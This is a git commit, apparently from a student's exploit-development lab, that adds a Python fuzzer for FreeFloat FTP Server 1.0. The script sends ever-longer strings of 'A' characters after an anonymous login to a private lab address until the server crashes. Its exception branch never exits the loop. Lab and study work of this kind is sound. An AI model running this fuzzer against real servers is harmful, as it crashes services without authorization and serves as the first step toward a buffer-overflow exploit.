160c3c4690a851adb48edab182c1f6d2e72a4ac6
richnadeau <rich.nadeau@mymail.champlain.edu>
2022-02-05 17:12:53 -0500

    Adding Fuzzer Python Script Used

---
+++ FreeFloat-FTP-1.0/Python/Fuzzer.py
@@ -0,0 +1,25 @@
+import socket
+import time
+import sys
+
+buffer = 'A'*100
+
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Connect to Target FreeFloat FTP Server
+        s.connect(('192.168.75.132', 21))
+        s.recv(1024)
+        s.send('USER anonymous\r\n')
+        s.recv(1024)
+        s.send('PASS anonymous\r\n')
+        s.recv(1024)
+        s.send(buffer + '\r\n')
+        s.recv(1024)
+        s.send('QUIT\r\n')
+        s.close()
+        print("[*] Buffer sent : " + str(len(buffer)))
+        time.sleep(1)
+        buffer = buffer + 'A'*100
+    except:
+        print("[*] Fuzzing crashed at byte : " + str(len(buffer)))
